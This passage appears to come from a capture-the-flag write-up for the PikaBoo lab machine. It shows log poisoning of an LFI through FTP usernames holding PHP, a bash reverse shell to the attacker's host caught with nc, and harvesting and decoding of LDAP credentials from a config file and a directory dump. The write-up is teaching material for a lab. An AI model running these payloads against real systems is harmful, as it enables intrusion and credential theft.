+<p>Either the admin staging panel is running out of <code class="language-plaintext highlighter-rouge">/var/www/admin_staging/</code> and then the included pages are in another directory, or the admin staging panel is running out of <code class="language-plaintext highlighter-rouge">/var/www/[something]/admin_staging</code>. Either way, I can read files in <code class="language-plaintext highlighter-rouge">/var</code>, but not in <code class="language-plaintext highlighter-rouge">/etc</code> (I verified with a few other checks, like <code class="language-plaintext highlighter-rouge">/etc/issue</code>).</p>
+<p>One weird thing - I am not able to access the Apache logs, <code class="language-plaintext highlighter-rouge">access.log</code> or <code class="language-plaintext highlighter-rouge">error.log</code> in <code class="language-plaintext highlighter-rouge">/var/log/apache2</code>. Perhaps they are in a non-default location, or the webserver lacks read access, or they are just empty.</p>
+<h3 id="log-poisoning">Log Poisoning</h3>
+<p>Log poisoning is a great attack against an LFI, but without the Apache logs, it doesn’t seem possible. But what about FTP? VSFTPd logs <a href="https://askubuntu.com/questions/829938/vsftpd-log-file-location">are stored in</a> <code class="language-plaintext highlighter-rouge">/var/log/vsftpd.log</code>. It shows logs via the LFI, with logs from July (likely when the box was developed/tested):</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20211130175417591.webp" type="image/webp"/>
+<img alt="image-20211130175417591" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20211130175417591.png"/>
+</picture>
+<p>I can try to log in with FTP, and the new login shows up as well:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20211130175556231.webp" type="image/webp"/>
+<img alt="image-20211130175556231" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20211130175556231.png"/>
+</picture>
+<p>Not only are attempts logged, but the username is in the logs.</p>
+<p>I tried another failed login:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>ftp 10.10.10.249
+<span class="go">Connected to 10.10.10.249.
+220 (vsFTPd 3.0.3)
+Name (10.10.10.249:oxdf): &lt;?php system('id'); ?&gt;
+331 Please specify the password.
+Password:
+530 Login incorrect.
+Login failed.
+ftp&gt; 
+</span></code></pre></div></div>
+<p>On refreshing the page with the logs in LFI, I have code execution:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20211021063650139.webp" type="image/webp"/>
+<img alt="image-20211021063650139" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20211021063650139.png"/>
+</picture>
+<h3 id="shell">Shell</h3>
+<p>To get a shell, I logged into FTP again:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>ftp 10.10.10.249
+<span class="go">Connected to 10.10.10.249.
+220 (vsFTPd 3.0.3)
+Name (10.10.10.249:oxdf): &lt;?php system('bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.6/443 0&gt;&amp;1"'); ?&gt;
+331 Please specify the password.
+Password:
+530 Login incorrect.
+Login failed.
+ftp&gt; 
+</span></code></pre></div></div>
+<p>With <code class="language-plaintext highlighter-rouge">nc</code> listening, I refreshed the log page:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">listening on [any] 443 ...
+connect to [10.10.14.6] from (UNKNOWN) [10.10.10.249] 49566
+bash: cannot set terminal process group (645): Inappropriate ioctl for device
+bash: no job control in this shell
+</span><span class="gp">www-data@pikaboo:/var/www/html/admin_staging$</span><span class="w"> </span><span class="nb">id</span>
+<span class="go">uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span></code></pre></div></div>
+<p>I can grab <code class="language-plaintext highlighter-rouge">user.txt</code> from the only home directory on the host:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@pikaboo:/home/pwnmeow$</span><span class="w"> </span><span class="nb">cat </span>user.txt
+<span class="go">23b4217f************************
+</span></code></pre></div></div>
+<p>And upgraded the shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@pikaboo:/var/www/html/admin_staging$</span><span class="w"> </span>python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("bash")'</span>
+<span class="go">&lt;_staging$ python3 -c 'import pty;pty.spawn("bash")'
+</span><span class="gp">www-data@pikaboo:/var/www/html/admin_staging$</span><span class="w"> </span>^Z
+<span class="go">[1]+  Stopped                 nc -lnvp 443
+</span><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
+<span class="go">nc -lnvp 443
+            reset
+reset: unknown terminal type unknown
+Terminal type? screen
+</span><span class="gp">www-data@pikaboo:/var/www/html/admin_staging$</span><span class="w"> 
+</span></code></pre></div></div>
+<h2 id="shell-as-root">Shell as root</h2>
+<h3 id="enumeration">Enumeration</h3>
+<h4 id="cron">cron</h4>
+<p>In poking around the file system, there’s a job that runs from <code class="language-plaintext highlighter-rouge">/etc/crontab as root</code> every minute:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@pikaboo:/var/www$</span><span class="w"> </span><span class="nb">cat</span> /etc/crontab
+<span class="c"># /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+</span><span class="go">
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+</span><span class="c"># Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+</span><span class="go">17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
+</span><span class="c">#
+</span><span class="go">* * * * * root /usr/local/bin/csvupdate_cron
+</span></code></pre></div></div>
+<p>The file is a short Bash script:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+<span class="k">for </span>d <span class="k">in</span> /srv/ftp/<span class="k">*</span>
+<span class="k">do
+  </span><span class="nb">cd</span> <span class="nv">$d</span>
+  /usr/local/bin/csvupdate <span class="si">$(</span><span class="nb">basename</span> <span class="nv">$d</span><span class="si">)</span> <span class="k">*</span>csv
+  /usr/bin/rm <span class="nt">-rf</span> <span class="k">*</span>
+<span class="k">done</span>
+</code></pre></div></div>
+<p>It will loop over directories in <code class="language-plaintext highlighter-rouge">/srv/ftp</code>, and for each change into them and then call <code class="language-plaintext highlighter-rouge">csvupdate [dir name] *.csv</code>. It will then remove all the files in that directory.</p>
+<p>There are a ton of folders in <code class="language-plaintext highlighter-rouge">/srv/ftp</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@pikaboo:/srv/ftp$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span>
+<span class="go">total 696
+drwx-wx--- 2 root ftp 4096 May 20 09:54 abilities
+drwx-wx--- 2 root ftp 4096 May 20 08:01 ability_changelog
+drwx-wx--- 2 root ftp 4096 May 20 08:01 ability_changelog_prose
+drwx-wx--- 2 root ftp 4096 May 20 08:01 ability_flavor_text
+drwx-wx--- 2 root ftp 4096 May 20 08:01 ability_names
+drwx-wx--- 2 root ftp 4096 May 20 08:01 ability_prose
+drwx-wx--- 2 root ftp 4096 May 20 08:01 berries
+drwx-wx--- 2 root ftp 4096 May 20 08:01 berry_firmness
+drwx-wx--- 2 root ftp 4096 May 20 08:01 berry_firmness_names
+...[snip]...
+</span><span class="gp">www-data@pikaboo:/srv/ftp$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-1</span> | <span class="nb">wc</span> <span class="nt">-l</span>
+<span class="go">174
+</span></code></pre></div></div>
+<p>www-data doesn’t have any access to any of the folders, only root and the <code class="language-plaintext highlighter-rouge">ftp</code> group.</p>
+<h4 id="csvupdate---analysis">csvupdate - Analysis</h4>
+<p><code class="language-plaintext highlighter-rouge">csvupdate</code> is a Perl script:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@pikaboo:/$</span><span class="w"> </span>file /usr/local/bin/csvupdate
+<span class="go">/usr/local/bin/csvupdate: Perl script text executable
+</span></code></pre></div></div>
+<p>The script is long, and the comments indicate it’s designed to update the PokeAPI with the data uploaded from FTP:</p>
+<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/perl</span>
+
+<span class="c1">##################################################################</span>
+<span class="c1"># Script for upgrading PokeAPI CSV files with FTP-uploaded data. #</span>
+<span class="c1">#                                                                #</span>
+<span class="c1"># Usage:                                                         #</span>
+<span class="c1"># ./csvupdate &lt;type&gt; &lt;file(s)&gt;                                   #</span>
+<span class="c1">#                                                                #</span>
+<span class="c1"># Arguments:                                                     #</span>
+<span class="c1"># - type: PokeAPI CSV file type                                  #</span>
+<span class="c1">#         (must have the correct number of fields)               #</span>
+<span class="c1"># - file(s): list of files containing CSV data                   #</span>
+<span class="c1">##################################################################</span>
+                                                    
+<span class="k">use</span> <span class="nv">strict</span><span class="p">;</span>
+<span class="k">use</span> <span class="nv">warnings</span><span class="p">;</span>
+<span class="k">use</span> <span class="nn">Text::</span><span class="nv">CSV</span><span class="p">;</span>
+
+<span class="k">my</span> <span class="nv">$csv_dir</span> <span class="o">=</span> <span class="p">"</span><span class="s2">/opt/pokeapi/data/v2/csv</span><span class="p">";</span> 
+
+<span class="k">my</span> <span class="nv">%csv_fields</span> <span class="o">=</span> <span class="p">(</span>            
+  <span class="p">'</span><span class="s1">abilities</span><span class="p">'</span> <span class="o">=&gt;</span> <span class="mi">4</span><span class="p">,</span>                    
+  <span class="p">'</span><span class="s1">ability_changelog</span><span class="p">'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>                  
+  <span class="p">'</span><span class="s1">ability_changelog_prose</span><span class="p">'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
+  <span class="p">'</span><span class="s1">ability_flavor_text</span><span class="p">'</span> <span class="o">=&gt;</span> <span class="mi">4</span><span class="p">,</span> 
+  <span class="p">'</span><span class="s1">ability_names</span><span class="p">'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>                       
+  <span class="p">'</span><span class="s1">ability_prose</span><span class="p">'</span> <span class="o">=&gt;</span> <span class="mi">4</span><span class="p">,</span>            
+  <span class="p">'</span><span class="s1">berries</span><span class="p">'</span> <span class="o">=&gt;</span> <span class="mi">10</span><span class="p">,</span>                               
+  <span class="p">'</span><span class="s1">berry_firmness</span><span class="p">'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
+<span class="o">...</span><span class="p">[</span><span class="nv">snip</span><span class="p">]</span><span class="o">...</span>
+  <span class="p">'</span><span class="s1">version_groups</span><span class="p">'</span> <span class="o">=&gt;</span> <span class="mi">4</span><span class="p">,</span>
+  <span class="p">'</span><span class="s1">version_names</span><span class="p">'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
+  <span class="p">'</span><span class="s1">versions</span><span class="p">'</span> <span class="o">=&gt;</span> <span class="mi">3</span>
+<span class="p">);</span>
+
+
+<span class="k">if</span><span class="p">(</span><span class="nv">$#ARGV</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="nb">die</span> <span class="p">"</span><span class="s2">Usage: $0 &lt;type&gt; &lt;file(s)&gt;</span><span class="se">\n</span><span class="p">";</span>
+<span class="p">}</span>
+
+<span class="k">my</span> <span class="nv">$type</span> <span class="o">=</span> <span class="nv">$ARGV</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">exists</span> <span class="nv">$csv_fields</span><span class="p">{</span><span class="nv">$type</span><span class="p">})</span>
+<span class="p">{</span>
+  <span class="nb">die</span> <span class="p">"</span><span class="s2">Unrecognised CSV data type: </span><span class="si">$type</span><span class="s2">.</span><span class="se">\n</span><span class="p">";</span>
+<span class="p">}</span>
+
+<span class="k">my</span> <span class="nv">$csv</span> <span class="o">=</span> <span class="nn">Text::</span><span class="nv">CSV</span><span class="o">-&gt;</span><span class="k">new</span><span class="p">({</span> <span class="s">sep_char</span> <span class="o">=&gt;</span> <span class="p">'</span><span class="s1">,</span><span class="p">'</span> <span class="p">});</span>
+
+<span class="k">my</span> <span class="nv">$fname</span> <span class="o">=</span> <span class="p">"</span><span class="si">${csv_dir}</span><span class="s2">/</span><span class="si">${type}</span><span class="s2">.csv</span><span class="p">";</span>
+<span class="nb">open</span><span class="p">(</span><span class="k">my</span> <span class="nv">$fh</span><span class="p">,</span> <span class="p">"</span><span class="s2">&gt;&gt;</span><span class="p">",</span> <span class="nv">$fname</span><span class="p">)</span> <span class="ow">or</span> <span class="nb">die</span> <span class="p">"</span><span class="s2">Unable to open CSV target file.</span><span class="se">\n</span><span class="p">";</span>
+
+<span class="nb">shift</span><span class="p">;</span>
+<span class="k">for</span><span class="p">(</span><span class="o">&lt;&gt;</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="nb">chomp</span><span class="p">;</span>
+  <span class="k">if</span><span class="p">(</span><span class="nv">$csv</span><span class="o">-&gt;</span><span class="nv">parse</span><span class="p">(</span><span class="vg">$_</span><span class="p">))</span>
+  <span class="p">{</span>
+    <span class="k">my</span> <span class="nv">@fields</span> <span class="o">=</span> <span class="nv">$csv</span><span class="o">-&gt;</span><span class="nv">fields</span><span class="p">();</span>
+    <span class="k">if</span><span class="p">(</span><span class="nv">@fields</span> <span class="o">!=</span> <span class="nv">$csv_fields</span><span class="p">{</span><span class="nv">$type</span><span class="p">})</span>
+    <span class="p">{</span>
+      <span class="nb">warn</span> <span class="p">"</span><span class="s2">Incorrect number of fields: '</span><span class="si">$_</span><span class="s2">'</span><span class="se">\n</span><span class="p">";</span>
+      <span class="k">next</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">print</span> <span class="nv">$fh</span> <span class="p">"</span><span class="si">$_</span><span class="se">\n</span><span class="p">";</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="nb">close</span><span class="p">(</span><span class="nv">$fh</span><span class="p">);</span>
+</code></pre></div></div>
+<p>Perl is a super confusing language to read, especially with things like the <a href="https://perlmaven.com/the-diamond-operator">diamond operator</a>, and the fact that variable types use different characters to indicate they are variables. For example <code class="language-plaintext highlighter-rouge">$</code> indicates a scaler (like <code class="language-plaintext highlighter-rouge">$csv_dir</code> or <code class="language-plaintext highlighter-rouge">$ARGV[0]</code>), <code class="language-plaintext highlighter-rouge">@</code> indicates an array (like <code class="language-plaintext highlighter-rouge">@ARGV</code>), and <code class="language-plaintext highlighter-rouge">%</code> indicates a hash table (like a Python dictionary, like <code class="language-plaintext highlighter-rouge">%csv_fields</code>).</p>
+<p>After defining <code class="language-plaintext highlighter-rouge">$csv_dir</code> and <code class="language-plaintext highlighter-rouge">%csv_fields</code>, it checks the length of the args (<code class="language-plaintext highlighter-rouge">$#ARGV</code>). If it’s less than one, it prints the usage and exits.</p>
+<p>Then it reads the first arg (<code class="language-plaintext highlighter-rouge">$ARG[0]</code> (Perl doesn’t store the calling program name in <code class="language-plaintext highlighter-rouge">@ARGS</code>)), and checks that it is on of the keys defined in <code class="language-plaintext highlighter-rouge">%csv_fields</code>. Each of the folders in <code class="language-plaintext highlighter-rouge">/srv/ftp</code> match up to parameters defined in this dictionary. If that’s ok, it opens an output <code class="language-plaintext highlighter-rouge">.csv</code> file with a handle <code class="language-plaintext highlighter-rouge">$fh</code>.</p>
+<p><code class="language-plaintext highlighter-rouge">shift</code> <a href="https://perlmaven.com/shift">with no args</a> will remove the first item from <code class="language-plaintext highlighter-rouge">@ARGV</code>, leaving just <code class="language-plaintext highlighter-rouge">*.csv</code>, which will be expanded to be all the <code class="language-plaintext highlighter-rouge">.csv</code> files in the directory.</p>
+<p><code class="language-plaintext highlighter-rouge">for(&lt;&gt;)</code> will open each of those files one by one, and loop over each line in each of those files, saving the line into the implied variable, <code class="language-plaintext highlighter-rouge">$_</code>. <code class="language-plaintext highlighter-rouge">chomp</code> will remove any whitespace from the end of that line and save the update in <code class="language-plaintext highlighter-rouge">$_</code>. Assuming the number of fields matches what’s in the hash table (dictionary), it will print that output to the file.</p>
+<h4 id="pokeapi">pokeapi</h4>
+<p>The script references updating data in <code class="language-plaintext highlighter-rouge">/opt/pokeapi/data/v2/csv</code>. I’ll check out the <code class="language-plaintext highlighter-rouge">/opt/pokeapi</code> directory:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@pikaboo:/opt/pokeapi$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">CODE_OF_CONDUCT.md  README.md         data                pokemon_v2
+CONTRIBUTING.md     Resources         docker-compose.yml  requirements.txt
+CONTRIBUTORS.txt    __init__.py       graphql             test-requirements.txt
+LICENSE.md          apollo.config.js  gunicorn.py.ini
+Makefile            config            manage.py
+</span></code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">config</code> directory might be interesting:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@pikaboo:/opt/pokeapi/config$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">__init__.py  docker-compose.py  local.py     urls.py
+__pycache__  docker.py          settings.py  wsgi.py
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">settings.py</code> defines a <code class="language-plaintext highlighter-rouge">DATABASES</code> dictionary:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">DATABASES</span> <span class="o">=</span> <span class="p">{</span>                                       
+    <span class="sh">"</span><span class="s">ldap</span><span class="sh">"</span><span class="p">:</span> <span class="p">{</span>                      
+        <span class="sh">"</span><span class="s">ENGINE</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">ldapdb.backends.ldap</span><span class="sh">"</span><span class="p">,</span>           
+        <span class="sh">"</span><span class="s">NAME</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">ldap:///</span><span class="sh">"</span><span class="p">,</span> 
+        <span class="sh">"</span><span class="s">USER</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">cn=binduser,ou=users,dc=pikaboo,dc=htb</span><span class="sh">"</span><span class="p">,</span>
+        <span class="sh">"</span><span class="s">PASSWORD</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">J~42%W?PFHl]g</span><span class="sh">"</span><span class="p">,</span>
+    <span class="p">},</span>                                              
+    <span class="sh">"</span><span class="s">default</span><span class="sh">"</span><span class="p">:</span> <span class="p">{</span>              
+        <span class="sh">"</span><span class="s">ENGINE</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">django.db.backends.sqlite3</span><span class="sh">"</span><span class="p">,</span>     
+        <span class="sh">"</span><span class="s">NAME</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">/opt/pokeapi/db.sqlite3</span><span class="sh">"</span><span class="p">,</span>
+    <span class="p">}</span>    
+<span class="p">}</span>   
+</code></pre></div></div>
+<p>The DB is SQLite, but there’s also LDAP creds.</p>
+<h4 id="ldap">ldap</h4>
+<p><code class="language-plaintext highlighter-rouge">netstat</code> shows that in addition to the ports already observed, 389 is also listening locally, which is typically LDAP:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@pikaboo:/$</span><span class="w"> </span>netstat <span class="nt">-tnlp</span>
+<span class="go">Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.1:81            0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:389           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      567/nginx: worker p 
+tcp6       0      0 :::21                   :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+tcp6       0      0 :::80                   :::*                    LISTEN      567/nginx: worker p
+</span></code></pre></div></div>
+<p>Just like I have on many occasions remotely enumerated LDAP, I can try <code class="language-plaintext highlighter-rouge">ldapsearch</code> from PikaBoo:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@pikaboo:/$</span><span class="w"> </span>ldapsearch <span class="nt">-h</span> 127.0.0.1 <span class="nt">-x</span> <span class="nt">-s</span> base namingcontexts
+<span class="go">ldap_bind: Inappropriate authentication (48)
+        additional info: anonymous bind disallowed
+</span></code></pre></div></div>
+<p>It requires auth. I’ve got the creds from the PokeAPI, and they work:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@pikaboo:/var/www$</span><span class="w"> </span>ldapsearch <span class="nt">-h</span> 127.0.0.1 <span class="nt">-x</span> <span class="nt">-s</span> base namingcontexts <span class="nt">-D</span> <span class="s1">'cn=binduser,ou=users,dc=pikaboo,dc=htb'</span> <span class="nt">-w</span> <span class="s1">'J~42%W?PFHl]g'</span>
+<span class="c"># extended LDIF
+#
+# LDAPv3
+# base &lt;&gt; (default) with scope baseObject
+# filter: (objectclass=*)
+# requesting: namingcontexts 
+#
+</span><span class="go">
+</span><span class="c">#
+</span><span class="go">dn:
+namingContexts: dc=htb
+
+</span><span class="c"># search result
+</span><span class="go">search: 2
+result: 0 Success
+
+</span><span class="c"># numResponses: 2
+# numEntries: 1
+</span></code></pre></div></div>
+<p>The DC is HTB. I’ll use that and dump everything under it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@pikaboo:/var/www$</span><span class="w"> </span>ldapsearch <span class="nt">-h</span> 127.0.0.1 <span class="nt">-x</span> <span class="nt">-b</span> <span class="s1">'dc=htb'</span> <span class="nt">-D</span> <span class="s1">'cn=binduser,ou=users,dc=pikaboo,dc=htb'</span> <span class="nt">-w</span> <span class="s1">'J~42%W?PFHl]g'</span>            
+<span class="c"># extended LDIF
+#
+# LDAPv3
+# base &lt;dc=htb&gt; with scope subtree
+# filter: (objectclass=*)
+# requesting: ALL
+#
+</span><span class="go">
+</span><span class="c"># htb
+</span><span class="go">dn: dc=htb
+objectClass: top
+objectClass: dcObject
+objectClass: organization
+o: htb
+dc: htb
+
+</span><span class="c"># admin, htb
+</span><span class="go">dn: cn=admin,dc=htb
+objectClass: simpleSecurityObject
+objectClass: organizationalRole
+cn: admin
+description: LDAP administrator
+userPassword:: e1NTSEF9bWxhdFNUTzJDZjZ6QjdVL2VyOVBUamtBVE5yZnJiVnE=
+
+</span><span class="c"># users, htb
+</span><span class="go">dn: ou=users,dc=htb
+objectClass: organizationalUnit
+objectClass: top
+ou: users
+
+</span><span class="c"># groups, htb
+</span><span class="go">dn: ou=groups,dc=htb
+objectClass: organizationalUnit
+objectClass: top
+ou: groups
+
+</span><span class="c"># pikaboo.htb
+</span><span class="go">dn: dc=pikaboo,dc=htb
+objectClass: domain
+dc: pikaboo
+
+</span><span class="c"># ftp.pikaboo.htb
+</span><span class="go">dn: dc=ftp,dc=pikaboo,dc=htb
+objectClass: domain
+dc: ftp
+
+</span><span class="c"># users, pikaboo.htb
+</span><span class="go">dn: ou=users,dc=pikaboo,dc=htb
+objectClass: organizationalUnit
+objectClass: top
+ou: users
+
+</span><span class="c"># pokeapi.pikaboo.htb
+</span><span class="go">dn: dc=pokeapi,dc=pikaboo,dc=htb
+objectClass: domain
+dc: pokeapi
+
+</span><span class="c"># users, ftp.pikaboo.htb
+</span><span class="go">dn: ou=users,dc=ftp,dc=pikaboo,dc=htb
+objectClass: organizationalUnit
+objectClass: top
+ou: users
+
+</span><span class="c"># groups, ftp.pikaboo.htb
+</span><span class="go">dn: ou=groups,dc=ftp,dc=pikaboo,dc=htb
+objectClass: organizationalUnit
+objectClass: top
+ou: groups
+
+</span><span class="c"># pwnmeow, users, ftp.pikaboo.htb
+</span><span class="go">dn: uid=pwnmeow,ou=users,dc=ftp,dc=pikaboo,dc=htb
+objectClass: inetOrgPerson
+objectClass: posixAccount
+objectClass: shadowAccount
+uid: pwnmeow
+cn: Pwn
+sn: Meow
+loginShell: /bin/bash
+uidNumber: 10000
+gidNumber: 10000
+homeDirectory: /home/pwnmeow
+userPassword:: X0cwdFQ0X0M0dGNIXyczbV80bEwhXw==
+
+</span><span class="c"># binduser, users, pikaboo.htb
+</span><span class="go">dn: cn=binduser,ou=users,dc=pikaboo,dc=htb
+cn: binduser
+objectClass: simpleSecurityObject
+objectClass: organizationalRole
+userPassword:: Sn40MiVXP1BGSGxdZw==
+
+</span><span class="c"># users, pokeapi.pikaboo.htb
+</span><span class="go">dn: ou=users,dc=pokeapi,dc=pikaboo,dc=htb
+objectClass: organizationalUnit
+objectClass: top
+ou: users
+
+</span><span class="c"># groups, pokeapi.pikaboo.htb
+</span><span class="go">dn: ou=groups,dc=pokeapi,dc=pikaboo,dc=htb
+objectClass: organizationalUnit
+objectClass: top
+ou: groups
+
+</span><span class="c"># search result
+</span><span class="go">search: 2
+result: 0 Success
+
+</span><span class="c"># numResponses: 15
+# numEntries: 14
+</span></code></pre></div></div>
+<p>There are three objects with <code class="language-plaintext highlighter-rouge">userPassword</code> fields filled in. admin’s decodes to a string starting with <code class="language-plaintext highlighter-rouge">{SSHA}</code>, which indicates the rest of the string is a salted SHA1 hash of the password in base64:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"e1NTSEF9bWxhdFNUTzJDZjZ6QjdVL2VyOVBUamtBVE5yZnJiVnE="</span> | <span class="nb">base64</span> <span class="nt">-d</span>
+<span class="go">{SSHA}mlatSTO2Cf6zB7U/er9PTjkATNrfrbVq
+</span></code></pre></div></div>
+<p>I can convert that to a typical 40-character hex view with <code class="language-plaintext highlighter-rouge">base64</code> and <code class="language-plaintext highlighter-rouge">xxd</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"mlatSTO2Cf6zB7U/er9PTjkATNrfrbVq"</span> | <span class="nb">base64</span> <span class="nt">-d</span> | xxd <span class="nt">-p</span>
+<span class="go">9a56ad4933b609feb307b53f7abf4f4e39004cdadfadb56a
+</span></code></pre></div></div>
+<p>I could try to crack that, but I’ll look at the others first. binduser’s isn’t hashed, but it matches the password I already know and used to dump the DB:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"Sn40MiVXP1BGSGxdZw=="</span> | <span class="nb">base64</span> <span class="nt">-d</span>
+<span class="go">J~42%W?PFHl]g
+</span></code></pre></div></div>
+<p>pwnmeow’s is also not hashed, and is new:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"X0cwdFQ0X0M0dGNIXyczbV80bEwhXw=="</span> | <span class="nb">base64</span> <span class="nt">-d</span>
+<span class="go">_G0tT4_C4tcH_'3m_4lL!_
+</span></code></pre></div></div>
+<h4 id="ftp-access">FTP Access</h4>
+<p>That password doesn’t work for the pwnmeow user on the box with <code class="language-plaintext highlighter-rouge">su</code> or <code class="language-plaintext highlighter-rouge">ssh</code>. But it does work for FTP:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>ftp 10.10.10.249
+<span class="go">Connected to 10.10.10.249.
+220 (vsFTPd 3.0.3)
+Name (10.10.10.249:oxdf): pwnmeow
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+</span><span class="gp">ftp&gt;</span><span class="w"> 
+</span></code></pre></div></div>
+<p>The directory contains the same folders as in <code class="language-plaintext highlighter-rouge">/srv/ftp</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ftp&gt;</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwx-wx---    2 ftp      ftp          4096 May 20 09:54 abilities
+drwx-wx---    2 ftp      ftp          4096 May 20 08:01 ability_changelog
+drwx-wx---    2 ftp      ftp          4096 May 20 08:01 ability_changelog_prose
+drwx-wx---    2 ftp      ftp          4096 May 20 08:01 ability_flavor_text
+drwx-wx---    2 ftp      ftp          4096 May 20 08:01 ability_names
+drwx-wx---    2 ftp      ftp          4096 May 20 08:01 ability_prose
+...[snip]...
+</span></code></pre></div></div>
